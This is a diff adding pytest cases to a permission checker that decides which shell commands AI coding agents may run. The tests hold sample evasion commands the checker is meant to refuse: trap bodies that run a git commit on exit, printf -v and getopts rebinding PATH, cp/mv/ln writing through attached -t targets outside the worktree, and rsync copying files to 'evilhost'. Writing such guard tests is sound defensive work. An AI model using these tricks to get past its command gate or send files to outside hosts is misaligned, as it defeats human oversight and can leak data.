@@ -2561,3 +2561,71 @@ def test_coder_add_and_commit_with_cwd_in_real_unit_worktree(tmp_path: Path) -> 
     assert decide(_cwd(_b("repo-coder", "git add -A"), wt), CFG).allow
     assert decide(_cwd(_b("repo-coder", "git commit -m x"), wt), CFG).allow
     assert not decide(_cwd(_b("repo-coder", "git add -A"), repo), CFG).allow
+
+
+@pytest.mark.parametrize("agent", ["repo-coder", "contract-spec", "charter-docs"])
+@pytest.mark.parametrize(
+    "command",
+    [
+        f"trap 'git -C {CWD} commit -am x' EXIT; ls",
+        f"printf -v PATH {CWD}/bin; pytest {CWD}/infra/a.tf",
+        "printf -vPATH x",
+        "getopts PATH x; git status",
+    ],
+)
+def test_worker_trap_getopts_printf_v_refused(agent: str, command: str) -> None:
+    # 0022: a trap body runs unchecked; printf -v and getopts rebind a variable such as PATH.
+    assert not decide(_b(agent, command), CFG).allow, (agent, command)
+
+
+def test_coder_plain_printf_allowed() -> None:
+    assert decide(_b("repo-coder", "printf 'x y'"), CFG).allow
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        f"cp -t{CWD}/infra {WT}/src/a.py",
+        f"mv -t{CWD}/infra {WT}/src/a.py",
+        f"cp -rt{CWD}/infra {WT}/src/a.py",
+        f"install -t {CWD}/infra {WT}/src/a.py",
+        f"ln -st{CWD}/infra {WT}/src/a.py",
+        f"touch -r{CWD}/infra/a.tf {WT}/src/a.py",
+        f"rsync {WT}/src/a.py evilhost:x",
+        f"rsync -e touch {WT}/src/a.py evilhost:x",
+        f"rsync -avze ssh {WT}/src/ {WT}/src/pkg/",
+        f"rsync --rsh=ssh {WT}/src/ {WT}/src/pkg/",
+        f"rsync {WT}/src/a.py rsync://host/x",
+        f"rsync --exclude x {CWD}/infra/ {WT}/src/pkg/",
+    ],
+)
+def test_coder_attached_targets_and_remote_rsync_refused(command: str) -> None:
+    # 0022: an attached -t<dir> is a write target; host:path is a remote rsync operand.
+    assert not decide(_b("repo-coder", command), CFG).allow, command
+
+
+def test_coder_rsync_remote_refused_from_unit_worktree_cwd(tmp_path: Path) -> None:
+    _, wt = _unit_repo(tmp_path / "repo")
+    (wt / "src").mkdir()
+    for command in (f"rsync {wt}/src/a.py evilhost:x", f"rsync -e touch {wt}/src/a.py evilhost:x"):
+        assert not decide(_cwd(_b("repo-coder", command), wt / "src"), CFG).allow, command
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        f"cp -t {WT}/src/pkg {WT}/src/a.py",
+        f"cp -t{WT}/src/pkg {WT}/src/a.py",
+        f"cp --target-directory={WT}/src/pkg {WT}/src/a.py",
+        f"cp --preserve=mode {WT}/src/a.py {WT}/src/b.py",
+        f"rsync -a {WT}/src/ {WT}/src/pkg/",
+        f"rsync -a --exclude '*.pyc' {WT}/src/ {WT}/src/pkg/",
+        f"rsync -a --filter '- *.pyc' --chmod u+w {WT}/src/ {WT}/src/pkg/",
+        f"mkdir -pm 700 {WT}/src/pkg",
+        f"mkdir -m700 {WT}/src/pkg",
+        f"install --mode 644 {WT}/src/a.py {WT}/src/b.py",
+        f"touch --date 2026-01-01 {WT}/src/a.py",
+    ],
+)
+def test_coder_value_options_skipped_as_non_paths(command: str) -> None:
+    assert decide(_b("repo-coder", command), CFG).allow, command
